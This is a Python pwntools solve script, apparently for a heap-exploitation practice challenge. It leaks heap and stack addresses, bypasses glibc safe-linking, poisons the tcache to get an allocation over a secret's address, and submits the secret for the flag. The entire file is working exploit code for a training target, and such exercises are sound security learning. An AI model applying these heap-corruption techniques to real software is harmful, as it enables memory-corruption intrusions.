# idea: stack_scanf -> stack_free -> malloc * 2 -> free * 2 -> puts -> get stack_free address leak
# malloc next to be secret addr -> puts

from pwn import *
BINARY = "/challenge/babyheap_level18.1"
p = process(BINARY)

def overwrite_alloc(alloc:int, loc:int, heap_mangle:int):
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'1')
    p.sendline(b'free')
    p.sendline(b'2')

    # allocations[1] = allocations[0]
    p.sendline(b'scanf')
    p.sendline(b'2')
    p.recv()
    p.sendline(tcache_mangle(alloc, heap_mangle))
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')

    # allocations[0] = loc
    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(p64(loc))

def scanf_to_pos(buf:bytes, pos:bytes):
    p.sendline(b'scanf')
    p.sendline(pos)
    p.recv()
    p.sendline(buf)
    p.recv()

def tcache_mangle(b:int, mangle:int)->bytes:
    return p64(b ^ mangle)

# leak heap addr
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'puts')
p.sendline(b'0')
p.recvuntil(b'Data: ')
heap_mangle = unpack(p.recvuntil(b'\n')[:-1], 'all')
heap_mangle = heap_mangle
print(f'heap_mangle = {hex(heap_mangle)}')
# cleanup
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')

# leak stack addr
fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
p.recv()
p.sendline(b'A' * 0x30 + fake_chunk)
p.recv()
p.sendline(b'stack_free')
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
# store stack addr for mangling
p.sendline(b'puts')
p.sendline(b'0')
p.recvuntil(b'Data: ')
stack_mangle = unpack(p.recvuntil(b'\n')[:-1], 'all')
stack_mangle = stack_mangle
print(f'stack_mangle = {hex(stack_mangle)}')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
stack_free_addr = stack_free_addr ^ heap_mangle
alloc_addr = stack_free_addr - (0x1f0 - 0x130)
print(f'alloc_addr = {hex(alloc_addr)}')
secret_addr = stack_free_addr + (0x130-0xa1)
print(f'secret_addr = {hex(secret_addr)}')

# cleanup before final steps
p.sendline(b'malloc')
p.sendline(b'8')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'9')
p.sendline(b'80')

# push secret addr to next chunk
secret = b''
overwrite_alloc(alloc_addr, secret_addr, heap_mangle)

# print first 8 bytes of secret
p.sendline(b'puts')
p.sendline(b'0')
p.recvuntil(b'Data: ')
secret += p.recvuntil(b'\n')[:-1]

print(secret)

# send_flag
p.sendline(b'send_flag')
p.recv()
p.sendline(secret)

p.interactive()